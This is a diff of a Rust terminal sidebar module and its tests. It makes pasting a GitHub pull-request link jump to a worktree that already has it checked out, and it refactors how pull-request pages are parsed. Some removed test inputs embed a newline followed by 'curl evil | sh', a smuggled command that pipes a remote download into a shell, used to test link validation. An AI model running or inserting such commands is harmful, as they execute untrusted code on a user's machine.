@@ -59,7 +59,7 @@ use crate::news::News;
 use crate::picker::{Aim, Here, Housed, Listing, Runs, Seated, Shelved, Unopened, Worktree};
 use crate::printed::Printed;
 use crate::prune;
-use crate::pull::{Found, Kind, Link, Others, Wanted, Work, Worked};
+use crate::pull::{Found, Link, Others, Wanted, Work, Worked};
 use crate::skills::{Name, Skill};
 use crate::spots::{Drawn, Keyed, Spots};
 use crate::sweep::{cells, Page, Sweep};
@@ -3566,12 +3566,13 @@ impl Sidebar {
         self.menu_did(Placed::of(origin), Did::Closed(done))
     }
 
-    pub fn paste(&mut self, text: &str) {
+    #[must_use]
+    pub fn paste(&mut self, text: &str) -> Asked {
         if let Mode::AfloatNote(_) = self.mode {
-            return;
+            return Asked::Nothing;
         }
         if self.open_mut().is_some_and(|menu| menu.paste(text)) {
-            return;
+            return Asked::Nothing;
         }
         let target = match self.open() {
             Some(menu) => Some(menu.target().clone()),
@@ -3579,18 +3580,34 @@ impl Sidebar {
         };
         let from = target.as_ref().and_then(Target::cwd).cloned();
         let Some(work) = Work::parse(text, from) else {
-            return;
+            return Asked::Nothing;
         };
         if self.notice_on_its_way(&work) {
-            return;
+            return Asked::Nothing;
+        }
+        let checked_out = match &work {
+            Work::Link(link) => {
+                self.checked_out_worktree(link, target.as_ref().map(Target::machine))
+            },
+            Work::File(_) => None,
+        };
+        let menu_afloat = matches!(self.mode, Mode::Afloat { .. });
+        if let Some((on, place)) = checked_out {
+            if menu_afloat {
+                self.close_menu();
+            } else {
+                self.end_mode();
+            }
+            assert!(self.open().is_none(), "a paste that goes leaves no menu open");
+            return self.go_to(on, Place::Worktree(place));
         }
         let Some(target) = target else {
             if self.lit_spot().is_none() {
                 self.say(format!("menu: no row is highlighted for {work} to open the menu on"));
             }
-            return;
+            return Asked::Nothing;
         };
-        let placed = if let Mode::Afloat { .. } = self.mode {
+        let placed = if menu_afloat {
             self.close_menu();
             Placed::Afloat
         } else {
@@ -3599,6 +3616,37 @@ impl Sidebar {
         };
         self.menus += 1;
         self.put(Menu::pull(self.menus, target, work, self.agent.harness()), placed);
+        Asked::Nothing
+    }
+
+    fn checked_out_worktree(
+        &self,
+        link: &Link,
+        preferred: Option<&Machine>,
+    ) -> Option<(Machine, WorktreePlace)> {
+        let host = self.host.as_ref()?;
+        let reached = machines(host, &self.shelves).each();
+        let reached = reached.filter_map(|(machine, seen)| Some((machine, seen.ok()?)));
+        let reached: Vec<_> = reached.collect();
+        let first = reached.iter().filter(|(machine, _)| Some(machine) == preferred);
+        let rest = reached.iter().filter(|(machine, _)| Some(machine) != preferred);
+        for (machine, seen) in first.chain(rest) {
+            let pulls = pull_requests(seen.pull_requests);
+            let checks_out = |worktree: &&KnownWorktree| {
+                let checked_out = pull_request_link(&pulls, worktree.folder.as_str());
+                checked_out.is_some_and(|it| it.is(link))
+            };
+            let worktrees = seen.projects.iter().flat_map(|known| &known.worktrees);
+            let mut found = worktrees.filter(checks_out);
+            let Some(worktree) = found.next() else {
+                continue;
+            };
+            if found.next().is_some() {
+                return None;
+            }
+            return Some((machine.clone(), worktree.place.clone()));
+        }
+        None
     }
 
     pub fn pull_in_menu(
@@ -3889,7 +3937,7 @@ impl Sidebar {
             let Some(dir) = dir else {
                 continue;
             };
-            let pull = pulls.get(dir.as_str()).and_then(|it| Link::parse(it.url.as_deref()?));
+            let pull = pull_request_link(&pulls, dir.as_str());
             let here = Self::seats_here(self.seated_on(on), listed);
             let Some(ViewPlace { session, view }) = ViewPlace::of(listed.clone(), view) else {
                 continue;
@@ -4862,6 +4910,10 @@ fn pull_requests(pull_requests: &[lunetad::api::PullRequest]) -> HashMap<&str, P
         .collect()
 }
 
+fn pull_request_link(pulls: &HashMap<&str, PullRequest>, dir: &str) -> Option<Link> {
+    Link::parse(pulls.get(dir)?.page.url())
+}
+
 fn moved<T: Clone>(items: &[T], taken: Range<usize>, to: usize) -> Vec<T> {
     let left = items.iter().enumerate().filter(|(at, _)| !taken.contains(at));
     let mut moved: Vec<T> = left.map(|(_, item)| item.clone()).collect();
@@ -5043,9 +5095,8 @@ fn numbered(pull_request: &PullRequest) -> Option<Numbered> {
         State::Closed => return None,
     };
     let checks = pull_request.verdict();
-    let number = pull_request.number;
-    let link = pull_request.url.as_deref().and_then(Link::parse);
-    let link = link.filter(|link| link.kind() == Kind::Pull && link.number() == number);
+    let number = pull_request.number();
+    let link = Link::parse(pull_request.page.url());
     let number = link.map_or(Number::Unlinked(number), |link| Number::Linked(Box::new(link)));
     Some(Numbered { number, colour, checks, stale: pull_request.stale })
 }
@@ -5624,6 +5675,7 @@ mod tests {
 
     use lunetad::api::shell::{ended, Ended, Going, Stopped};
     use lunetad::api::{self, NameSource, View, UnreadFile, Version};
+    use luneta_protocol::github::PullPage;
     use prost_types::Timestamp;
     use ratatui::buffer::Cell;
 
@@ -7566,8 +7618,8 @@ mod tests {
             let changes = Changes { modified, ..Changes::default() };
             let status = GitStatus::Checkout { repository: None, head, changes, stashes: 0 };
             host.git_statuses.push(status.to_api(dir));
-            let number = NonZeroU32::new(number).expect("a pull request's number");
-            let pull_request = PullRequest { number, state, url: None, checks: None, stale: false };
+            let page = owner_s_page(number);
+            let pull_request = PullRequest { page, state, checks: None, stale: false };
             host.pull_requests.push(pull_request.to_api(dir));
         }
         let mut sidebar = fresh();
@@ -7620,9 +7672,8 @@ mod tests {
             };
             host.git_statuses.push(status.to_api(dir));
             if number > 0 {
-                let number = NonZeroU32::new(number).expect("a pull request's number");
-                let (state, url) = (State::Open, None);
-                let pull_request = PullRequest { number, state, url, checks: None, stale: false };
+                let (page, state) = (owner_s_page(number), State::Open);
+                let pull_request = PullRequest { page, state, checks: None, stale: false };
                 host.pull_requests.push(pull_request.to_api(dir));
             }
         }
@@ -7680,10 +7731,8 @@ mod tests {
             let changes = Changes::default();
             let status = GitStatus::Checkout { repository: None, head, changes, stashes: 0 };
             host.git_statuses.push(status.to_api(dir));
-            let number = NonZeroU32::new(number).expect("a pull request's number");
-            let url = Some(format!("https://github.com/owner/repo/pull/{number}"));
-            let stale = dir == "/w/g";
-            let pull_request = PullRequest { number, state, url, checks, stale };
+            let (page, stale) = (owner_s_page(number), dir == "/w/g");
+            let pull_request = PullRequest { page, state, checks, stale };
             host.pull_requests.push(pull_request.to_api(dir));
         }
         let mut sidebar = fresh();
@@ -7729,13 +7778,12 @@ mod tests {
         let changes = Changes { modified: 1, ..Changes::default() };
         let status = GitStatus::Checkout { repository: None, head, changes, stashes: 0 };
         host.git_statuses.push(status.to_api("/w/issue-489"));
-        let number = NonZeroU32::new(538).expect("a pull request's number");
-        let url = Some(LINK.replace("246", "538"));
+        let page = PullPage::parse(&LINK.replace("246", "538")).expect("a pull request's page");
         let (state, checks) = (State::Open, None);
-        let pull_request = PullRequest { number, state, url, checks, stale: false };
+        let pull_request = PullRequest { page, state, checks, stale: false };
         host.pull_requests.push(pull_request.to_api("/w/issue-489"));
         let (statuses, pulls) = (&mut host.git_statuses, &mut host.pull_requests);
-        checked_out(statuses, pulls, "/w/fix", "fix", Some((246, State::Open, Some(LINK))));
+        checked_out(statuses, pulls, "/w/fix", "fix", Some((State::Open, LINK)));
         sidebar.heard(host);
 
         let one = "  ▾ issue-489 +120 -34 #538  !";
@@ -8133,22 +8181,26 @@ mod tests {
         Link::parse(LINK).expect("a link")
     }
 
+    fn owner_s_page(number: u32) -> PullPage {
+        let page = PullPage::parse(&format!("https://github.com/owner/repo/pull/{number}"));
+        page.expect("a pull request's page")
+    }
+
     fn checked_out(
         git_statuses: &mut Vec<api::GitStatus>,
         pull_requests: &mut Vec<api::PullRequest>,
         dir: &str,
         branch: &str,
-        pull: Option<(u32, State, Option<&str>)>,
+        pull: Option<(State, &str)>,
     ) {
         let name = Said::new(branch.to_owned()).expect("a branch's name");
         let head = Head::Branch { name, upstream: None, changed: None };
         let changes = Changes::default();
         let status = GitStatus::Checkout { repository: None, head, changes, stashes: 0 };
         git_statuses.push(status.to_api(dir));
-        if let Some((number, state, url)) = pull {
-            let number = NonZeroU32::new(number).expect("a pull request's number");
-            let url = url.map(str::to_owned);
-            let pull_request = PullRequest { number, state, url, checks: None, stale: false };
+        if let Some((state, url)) = pull {
+            let page = PullPage::parse(url).expect("a pull request's page");
+            let pull_request = PullRequest { page, state, checks: None, stale: false };
             pull_requests.push(pull_request.to_api(dir));
         }
     }
@@ -8163,9 +8215,10 @@ mod tests {
         let mut host = host(vec![session("s", 10, views.chain(more).collect())], Vec::new());
         let (statuses, pulls) = (&mut host.git_statuses, &mut host.pull_requests);
         let closed = "https://github.com/owner/repo/pull/9";
-        checked_out(statuses, pulls, "/w/a", "fix", Some((246, State::Open, Some(LINK))));
-        checked_out(statuses, pulls, "/w/b", "old", Some((7, State::Open, None)));
-        checked_out(statuses, pulls, "/w/c", "gone", Some((9, State::Closed, Some(closed))));
+        checked_out(statuses, pulls, "/w/a", "fix", Some((State::Open, LINK)));
+        let off_github = "https://ghe.example/owner/repo/pull/7";
+        checked_out(statuses, pulls, "/w/b", "old", Some((State::Open, off_github)));
+        checked_out(statuses, pulls, "/w/c", "gone", Some((State::Closed, closed)));
         checked_out(statuses, pulls, "/w/d", "none", None);
         let mut sidebar = fresh();
         sidebar.hear(host);
@@ -8337,7 +8390,7 @@ mod tests {
         let views = vec![view(1, 1, "/w/a", "fish")];
         let mut host = host(vec![session("s", 10, views)], Vec::new());
         let (statuses, pulls) = (&mut host.git_statuses, &mut host.pull_requests);
-        checked_out(statuses, pulls, "/w/a", "fix", Some((5, State::Open, Some(said))));
+        checked_out(statuses, pulls, "/w/a", "fix", Some((State::Open, said)));
         let mut sidebar = fresh();
         sidebar.hear(host);
         sidebar.focus(Keys::Sidebar);
@@ -8346,37 +8399,29 @@ mod tests {
     }
 
     #[test]
-    fn a_page_that_is_not_the_link_of_the_number_stays_on_the_row() {
+    fn a_page_off_github_stays_on_the_row() {
         let now = moment(160_000);
-        for said in [
-            "https://github.com/owner/repo/pull/6",
-            "https://github.com/owner/repo/issues/5",
-            "https://ghe.example/owner/repo/pull/5",
-            "file:///tmp/run.desktop",
-            "https://github.com/owner/repo/pull/5\ncurl evil | sh",
-        ] {
-            let mut sidebar = pull_said(said);
-            let area = Rect::new(0, 0, 32, 24);
-            let mut buffer = Buffer::empty(area);
-            let drawn = sidebar.draw(&mut buffer, area, now);
-            let line: String = (0..31).map(|x| buffer[(x, 6)].symbol()).collect();
-            assert!(line.contains("fix #5"), "{said:?}: {line}");
-            assert!(number_spot(&drawn, 6).is_empty(), "{said:?}");
+        let mut sidebar = pull_said("https://ghe.example/owner/repo/pull/5");
+        let area = Rect::new(0, 0, 32, 24);
+        let mut buffer = Buffer::empty(area);
+        let drawn = sidebar.draw(&mut buffer, area, now);
+        let line: String = (0..31).map(|x| buffer[(x, 6)].symbol()).collect();
+        assert!(line.contains("fix #5"), "{line}");
+        assert_eq!(number_spot(&drawn, 6), [] as [u16; 0]);
 
-            let note = "#5: lunetad says no link of it on github.com";
-            sidebar.key(&char('y'), now);
-            assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing, "{said:?}");
-            assert_eq!(sidebar.notice.as_deref(), Some(note));
-            assert_eq!(sidebar.copied, None);
-            assert_eq!(open_pull(&mut sidebar, now), Asked::Nothing, "{said:?}");
-            assert_eq!(sidebar.notice.as_deref(), Some(note));
-        }
+        let note = "#5: lunetad says no link of it on github.com";
+        sidebar.key(&char('y'), now);
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
+        assert_eq!(sidebar.notice.as_deref(), Some(note));
+        assert_eq!(sidebar.copied, None);
+        assert_eq!(open_pull(&mut sidebar, now), Asked::Nothing);
+        assert_eq!(sidebar.notice.as_deref(), Some(note));
     }
 
     #[test]
-    fn a_page_that_reads_is_taken_as_luneta_spells_it() {
+    fn a_page_is_taken_as_luneta_spells_it() {
         let now = moment(160_000);
-        let mut sidebar = pull_said("https://github.com/owner/repo/pull/5?\ncurl evil | sh");
+        let mut sidebar = pull_said("https://www.github.com/owner/repo/pull/5");
         let Asked::Browse(link) = open_pull(&mut sidebar, now) else {
             panic!("the row's link opens");
         };
@@ -8403,7 +8448,7 @@ mod tests {
             panic!("nixos is reached");
         };
         let (statuses, pulls) = (&mut there.git_statuses, &mut there.pull_requests);
-        checked_out(statuses, pulls, "/w/b", "fix", Some((8, State::Open, Some(far))));
+        checked_out(statuses, pulls, "/w/b", "fix", Some((State::Open, far)));
         let mut sidebar = fresh();
         sidebar.hear(host);
         sidebar.focus(Keys::Sidebar);
@@ -8459,8 +8504,8 @@ mod tests {
         let (statuses, pulls) = (&mut host.git_statuses, &mut host.pull_requests);
         let long = "handoff-eng-11259-and-more";
         let (merged, draft) = (LINK.replace("246", "4321"), LINK.replace("246", "12"));
-        checked_out(statuses, pulls, "/w/e", long, Some((4321, State::Merged, Some(&merged))));
-        checked_out(statuses, pulls, "/w/f", "日本語の枝の名前が長い", Some((12, State::Draft, Some(&draft))));
+        checked_out(statuses, pulls, "/w/e", long, Some((State::Merged, &merged)));
+        checked_out(statuses, pulls, "/w/f", "日本語の枝の名前が長い", Some((State::Draft, &draft)));
         let host = sidebar.host.clone().unwrap();
         sidebar.hear(host);
 
@@ -8848,7 +8893,8 @@ mod tests {
             for key in opens {
                 sidebar.key(key, now);
             }
-            sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+            let asked = sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+            assert_eq!(asked, Asked::Nothing);
             assert!(sidebar.open().is_some());
             sidebar.drop_menu(sidebar.menus);
             assert!(sidebar.open().is_none());
@@ -8862,7 +8908,7 @@ mod tests {
         sidebar.focus(Keys::Sidebar);
         let now = moment(160_000);
         sidebar.key(&char('d'), now);
-        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), Asked::Nothing);
         let soon = now + Duration::from_millis(1);
         assert!(shows_at(&mut sidebar, soon, "─ #5 "));
         assert_eq!(sidebar.due(soon), None);
@@ -9036,21 +9082,69 @@ mod tests {
         assert_eq!(sidebar.key(&char('d'), moment(160_000)), close_here(act, 1));
     }
 
+    fn check_out_pull(sidebar: &mut Sidebar, dir: &str, number: u32) {
+        let Some(host) = &mut sidebar.host else {
+            panic!("the sidebar has heard of no host");
+        };
+        let url = format!("https://github.com/lorenzolfm/luneta/pull/{number}");
+        let pull = Some((State::Open, url.as_str()));
+        checked_out(&mut Vec::new(), &mut host.pull_requests, dir, "feat", pull);
+    }
+
+    #[test]
+    fn a_pull_request_s_link_pasted_goes_to_its_worktree_when_one_is_present() {
+        let mut sidebar = own_two_sessions();
+        sit(&mut sidebar, &own_view_of("older", 1, 1));
+        check_out_pull(&mut sidebar, "/w/b", 5);
+        sidebar.focus(Keys::Sidebar);
+        let young = WorktreePlace { project: project_row("young", 2), worktree: tab_of(2, 0) };
+        let there = Asked::Go { on: Machine::Local, place: Place::Worktree(young) };
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5\n"), there);
+        assert!(sidebar.open().is_none());
+
+        let link = Link::parse("https://github.com/lorenzolfm/luneta/pull/5").unwrap();
+        let worked = sidebar.worked(&Machine::Local).unwrap();
+        let carries = |it: &&Worked| it.works.pull.as_ref().is_some_and(|it| it.is(&link));
+        let worked = worked.iter().filter(carries);
+        let sessions: Vec<&Listed> = worked.map(|it| &it.session).collect();
+        assert_eq!(sessions, [&own_listed("young", 2)]);
+
+        sidebar.key(&char('m'), moment(160_000));
+        assert!(sidebar.open().is_some());
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), there);
+        assert!(sidebar.open().is_none());
+
+        let as_an_issue = "https://github.com/lorenzolfm/luneta/issues/5";
+        assert_eq!(sidebar.paste(as_an_issue), there, "GitHub numbers issues and pulls as one");
+        let elsewhere = ["lorenzolfm/luneta/pull/6", "lorenzolfm/zed/pull/5"];
+        for elsewhere in elsewhere.map(|it| format!("https://github.com/{it}")) {
+            assert_eq!(sidebar.paste(&elsewhere), Asked::Nothing, "{elsewhere}");
+            assert!(sidebar.open().is_some(), "{elsewhere}");
+            sidebar.drop_menu(sidebar.menus);
+        }
+    }
+
+    #[test]
+    fn a_pull_request_s_link_pasted_opens_the_menu_when_two_worktrees_have_it() {
+        let link = "https://github.com/lorenzolfm/luneta/pull/5";
+        let mut sidebar = own_two_sessions();
+        sit(&mut sidebar, &own_view_of("older", 1, 1));
+        check_out_pull(&mut sidebar, "/w/b", 5);
+        check_out_pull(&mut sidebar, "/w/c", 5);
+        sidebar.focus(Keys::Sidebar);
+        assert_eq!(sidebar.paste(link), Asked::Nothing);
+        assert!(sidebar.open().is_some());
+    }
+
     #[test]
     fn a_pull_request_s_link_pasted_opens_the_menu_for_it() {
         let mut sidebar = own_two_sessions();
         sit(&mut sidebar, &own_view_of("older", 1, 1));
-        if let Some(host) = &mut sidebar.host {
-            let number = NonZeroU32::new(5).unwrap();
-            let url = Some("https://github.com/lorenzolfm/luneta/pull/5".to_owned());
-            let state = State::Open;
-            let pull_request = PullRequest { number, state, url, checks: None, stale: false };
-            host.pull_requests.push(pull_request.to_api("/w/b"));
-        }
+        check_out_pull(&mut sidebar, "/w/b", 7);
         sidebar.focus(Keys::Sidebar);
-        sidebar.paste("ls -la");
+        assert_eq!(sidebar.paste("ls -la"), Asked::Nothing);
         assert!(sidebar.open().is_none());
-        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5\n");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5\n"), Asked::Nothing);
         let lines = screen(&mut sidebar, true, 32, 17);
         assert_eq!(lines[12..], [
             "─ #5 ────── lorenzolfm/luneta ─",
@@ -9060,6 +9154,7 @@ mod tests {
             " <ESC> - Close",
         ]);
         let link = Link::parse("https://github.com/lorenzolfm/luneta/pull/5").unwrap();
+        let on_b = Link::parse("https://github.com/lorenzolfm/luneta/pull/7").unwrap();
         let worked = |session, view, dir: &str, pull, here| Worked {
             session,
             view,
@@ -9068,7 +9163,7 @@ mod tests {
         let worked = vec![
             worked(own_listed("older", 1), view_key(1, 1), "/w/luneta/main", None, true),
             worked(own_listed("older", 1), view_key(1, 2), "/w/c", None, true),
-            worked(own_listed("young", 2), view_key(2, 1), "/w/b", Some(link.clone()), false),
+            worked(own_listed("young", 2), view_key(2, 1), "/w/b", Some(on_b), false),
         ];
         let work = Work::Link(link.clone());
         let wanted = Wanted::AsItIs;
@@ -9105,7 +9200,7 @@ mod tests {
         let pulling = || {
             let mut sidebar = own_two_sessions();
             sidebar.focus(Keys::Sidebar);
-            sidebar.paste(page);
+            assert_eq!(sidebar.paste(page), Asked::Nothing);
             let Asked::Pull { .. } = sidebar.key(&char('r'), moment(160_000)) else {
                 panic!("no job for the key");
             };
@@ -9140,7 +9235,7 @@ mod tests {
 
         let mut sidebar = own_two_sessions();
         sidebar.focus(Keys::Sidebar);
-        sidebar.paste(page);
+        assert_eq!(sidebar.paste(page), Asked::Nothing);
         let Asked::Pull { .. } = sidebar.key(&char('w'), moment(160_000)) else {
             panic!("no job for the key");
         };
@@ -9165,7 +9260,7 @@ mod tests {
     fn esc_closes_a_menu_that_waits_and_what_it_started_goes_on() {
         let mut sidebar = two_sessions();
         sidebar.focus(Keys::Sidebar);
-        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), Asked::Nothing);
         let Asked::Pull { .. } = sidebar.key(&char('w'), moment(160_000)) else {
             panic!("no job for the key");
         };
@@ -9187,21 +9282,21 @@ mod tests {
         let page = "https://github.com/lorenzolfm/luneta/pull/5";
         let mut sidebar = two_sessions();
         sidebar.focus(Keys::Sidebar);
-        sidebar.paste(page);
+        assert_eq!(sidebar.paste(page), Asked::Nothing);
         let Asked::Pull { .. } = sidebar.key(&char('w'), moment(160_000)) else {
             panic!("no job for the key");
         };
         let number = sidebar.open().map_or(0, Menu::number);
-        sidebar.paste(page);
+        assert_eq!(sidebar.paste(page), Asked::Nothing);
         assert_eq!(sidebar.open().map(Menu::number), Some(number));
         sidebar.focus(Keys::Terminal);
         assert!(sidebar.working.contains_key(&number));
         sidebar.notice = None;
         sidebar.focus(Keys::Terminal);
-        sidebar.paste(page);
+        assert_eq!(sidebar.paste(page), Asked::Nothing);
         assert!(sidebar.open().is_none());
         assert_eq!(sidebar.notice.as_deref(), Some("#5 is on its way"));
-        sidebar.paste("https://github.com/lorenzolfm/luneta/issues/6");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/issues/6"), Asked::Nothing);
         assert!(sidebar.open().is_some());
     }
 
@@ -9210,8 +9305,8 @@ mod tests {
         let page = "https://github.com/lorenzolfm/luneta/pull/5";
         let mut sidebar = two_sessions();
         sidebar.focus(Keys::Sidebar);
-        sidebar.paste(page);
-        sidebar.paste(page);
+        assert_eq!(sidebar.paste(page), Asked::Nothing);
+        assert_eq!(sidebar.paste(page), Asked::Nothing);
         assert_eq!(sidebar.open().map(Menu::number), Some(2));
         assert_eq!(sidebar.notice, None);
         assert!(sidebar.working.is_empty());
@@ -9222,7 +9317,7 @@ mod tests {
         let page = "https://github.com/lorenzolfm/luneta/pull/5";
         let mut pasted = own_two_sessions();
         pasted.focus(Keys::Sidebar);
-        pasted.paste(page);
+        assert_eq!(pasted.paste(page), Asked::Nothing);
         let keyed = pasted.key(&char('r'), moment(160_000));
         assert!(matches!(keyed, Asked::Pull { .. }), "{keyed:?}");
         let mut picked = own_two_sessions();
@@ -9242,14 +9337,15 @@ mod tests {
         let waiting = || {
             let mut sidebar = own_two_sessions();
             sidebar.focus(Keys::Sidebar);
-            sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+            let asked = sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+            assert_eq!(asked, Asked::Nothing);
             let Asked::Pull { .. } = sidebar.key(&char('w'), moment(160_000)) else {
                 panic!("no job for the key");
             };
             sidebar
         };
         let mut sidebar = waiting();
-        sidebar.paste("https://github.com/lorenzolfm/luneta/issues/6");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/issues/6"), Asked::Nothing);
         assert_eq!(sidebar.open().map(Menu::number), Some(2));
         assert!(sidebar.working.contains_key(&1));
 
@@ -9264,13 +9360,13 @@ mod tests {
     fn a_kept_menu_s_last_answer_leaves_the_open_menu_alone() {
         let mut sidebar = own_two_sessions();
         sidebar.focus(Keys::Sidebar);
-        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), Asked::Nothing);
         let Asked::Pull { .. } = sidebar.key(&char('w'), moment(160_000)) else {
             panic!("no job for the key");
         };
         sidebar.key(&KeyEvent::from(KeyCode::Esc), moment(161_000));
         let page = "https://github.com/lorenzolfm/luneta/issues/6";
-        sidebar.paste(page);
+        assert_eq!(sidebar.paste(page), Asked::Nothing);
         let Asked::Pull { .. } = sidebar.key(&char('w'), moment(162_000)) else {
             panic!("no job for the key");
         };
@@ -9300,12 +9396,12 @@ mod tests {
             "github.com/o/r/blob/main/README.md",
             ".md",
         ] {
-            sidebar.paste(text);
+            assert_eq!(sidebar.paste(text), Asked::Nothing);
             assert!(sidebar.open().is_none(), "{text:?}");
         }
         let Some(Target::View(on, row)) = sidebar.target() else { panic!("not a view's row") };
         let from = row.cwd.at().cloned();
-        sidebar.paste("  docs/plans/sync-rework.md\n");
+        assert_eq!(sidebar.paste("  docs/plans/sync-rework.md\n"), Asked::Nothing);
         let lines = screen(&mut sidebar, true, 39, 17);
         assert_eq!(lines[12..], [
             "─ sync-rework ─ plans/sync-rework.md ─",
@@ -9324,7 +9420,7 @@ mod tests {
         let mut sidebar = two_sessions();
         sidebar.focus(Keys::Sidebar);
         sidebar.light(Spot::Local(Place::Session(listed("older", 10))));
-        sidebar.paste("/w/plan.md");
+        assert_eq!(sidebar.paste("/w/plan.md"), Asked::Nothing);
         let Asked::Pull { work, .. } = sidebar.key(&char('w'), moment(160_000)) else {
             panic!("no job for the key");
         };
@@ -9337,7 +9433,7 @@ mod tests {
         let pressed = |key: char, branch: Option<&str>, moved_off: bool| {
             let mut sidebar = own_two_sessions();
             sidebar.focus(Keys::Sidebar);
-            sidebar.paste(page);
+            assert_eq!(sidebar.paste(page), Asked::Nothing);
             let number = sidebar.open().map_or(0, Menu::number);
             let Asked::Pull { wanted, .. } = sidebar.key(&char(key), moment(160_000)) else {
                 panic!("no job for the key");
@@ -9372,7 +9468,7 @@ mod tests {
                 sit(&mut sidebar, &view_of("older", 10, 1));
                 float_a_menu(&mut sidebar);
             }
-            sidebar.paste(page);
+            assert_eq!(sidebar.paste(page), Asked::Nothing);
             let number = sidebar.open().map_or(0, Menu::number);
             let Asked::Pull { .. } = sidebar.key(&char('t'), moment(160_000)) else {
                 panic!("no job for the key");
@@ -9403,7 +9499,7 @@ mod tests {
         type_in(&mut sidebar, "j");
         let Some(Target::View(_, row)) = sidebar.target() else { panic!("not a view's row") };
         assert!(matches!(row.cwd, Cwd::Unread { .. }), "{:?}", row.cwd);
-        sidebar.paste("docs/plan.md");
+        assert_eq!(sidebar.paste("docs/plan.md"), Asked::Nothing);
         let Asked::Pull { work, worked, .. } = sidebar.key(&char('w'), moment(160_000)) else {
             panic!("no job for the key");
         };
@@ -9509,7 +9605,7 @@ mod tests {
         let left = |at| {
             let mut sidebar = two_sessions();
             sidebar.focus(Keys::Sidebar);
-            sidebar.paste(page);
+            assert_eq!(sidebar.paste(page), Asked::Nothing);
             let number = sidebar.open().map_or(0, Menu::number);
             let Asked::Pull { .. } = sidebar.key(&char('w'), moment(160_000)) else {
                 panic!("no job for the key");
@@ -9532,7 +9628,7 @@ mod tests {
         let page = "https://github.com/lorenzolfm/luneta/issues/5";
         let mut sidebar = two_sessions();
         sidebar.focus(Keys::Sidebar);
-        sidebar.paste(page);
+        assert_eq!(sidebar.paste(page), Asked::Nothing);
         let number = sidebar.open().map_or(0, Menu::number);
         let Asked::Pull { .. } = sidebar.key(&char('t'), moment(160_000)) else {
             panic!("no job for the key");
@@ -10684,7 +10780,7 @@ mod tests {
         let views = vec![view(1, 1, "/w/a", long)];
         let mut local = host(vec![session(long, 10, views)], Vec::new());
         let (statuses, pulls) = (&mut local.git_statuses, &mut local.pull_requests);
-        checked_out(statuses, pulls, "/w/a", long, Some((246, State::Open, Some(LINK))));
+        checked_out(statuses, pulls, "/w/a", long, Some((State::Open, LINK)));
         local.remotes = vec![remote("me@a-host-too-long-for-the-sidebar", down(100))];
         let mut sidebar = fresh();
         sidebar.this = long.to_owned();
@@ -11070,6 +11166,40 @@ mod tests {
     }
 
     #[test]
+    fn a_pasted_pull_request_goes_to_its_worktree_on_the_row_s_machine_first_then_on_any() {
+        let link = "https://github.com/lorenzolfm/luneta/pull/5";
+        let pulled = |dir: &str| {
+            let mut pull_requests = Vec::new();
+            let pull = Some((State::Open, link));
+            checked_out(&mut Vec::new(), &mut pull_requests, dir, "feat", pull);
+            pull_requests
+        };
+        let mut host = machines();
+        let views = vec![view(1, 0, "/w/b", "claude")];
+        let mut nixos_host = up(vec![session("main", 20, views)], Vec::new());
+        if let Reached::Host(far) = &mut nixos_host {
+            far.pull_requests = pulled("/w/b");
+        }
+        host.remotes[0] = remote("nixos", nixos_host);
+        let (here, there) = (project_row("main", 10), project_row("main", 20));
+        let here = Place::Worktree(WorktreePlace { project: here, worktree: tab_of(10, 0) });
+        let there = Place::Worktree(WorktreePlace { project: there, worktree: tab_of(20, 0) });
+        let mut sidebar = fresh();
+        sidebar.hear(host.clone());
+        sidebar.focus(Keys::Sidebar);
+        sidebar.light(Spot::Local(view_of("main", 10, 1)));
+        let far = Asked::Go { on: Machine::Remote(nixos()), place: there.clone() };
+        assert_eq!(sidebar.paste(link), far);
+
+        host.pull_requests = pulled("/w/a");
+        sidebar.hear(host);
+        sidebar.light(Spot::Local(view_of("main", 10, 1)));
+        assert_eq!(sidebar.paste(link), Asked::Go { on: Machine::Local, place: here });
+        sidebar.light(Spot::Remote(nixos(), view_of("main", 20, 1)));
+        assert_eq!(sidebar.paste(link), far);
+    }
+
+    #[test]
     fn another_machine_s_rows_go_there_and_open_there() {
         let mut sidebar = fresh();
         let mut host = machines();
@@ -11112,7 +11242,7 @@ mod tests {
         let lines = screen(&mut sidebar, true, area.width, area.height);
         assert_eq!(lines[10], "   ✓ \u{ec82} fix                  1m");
 
-        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), Asked::Nothing);
         let pasted = sidebar.open().map(Menu::target);
         assert_eq!(pasted, Some(&Target::View(on, ViewRow { ran: Ran::Unhooked, ..row })));
     }
@@ -11126,7 +11256,7 @@ mod tests {
         sidebar.hear(host.clone());
         sidebar.focus(Keys::Sidebar);
         sidebar.light(Spot::Remote(nixos(), Place::Session(listed("work", 20))));
-        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), Asked::Nothing);
         let number = sidebar.open().map_or(0, Menu::number);
         let on = Machine::Remote(nixos());
         let link = Link::parse("https://github.com/lorenzolfm/luneta/pull/5").unwrap();
@@ -11171,7 +11301,7 @@ mod tests {
 
         let nixos = Machine::Remote(nixos());
         let vps = Machine::Remote("me@vps".parse().unwrap());
-        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), Asked::Nothing);
         let number = sidebar.open().map_or(0, Menu::number);
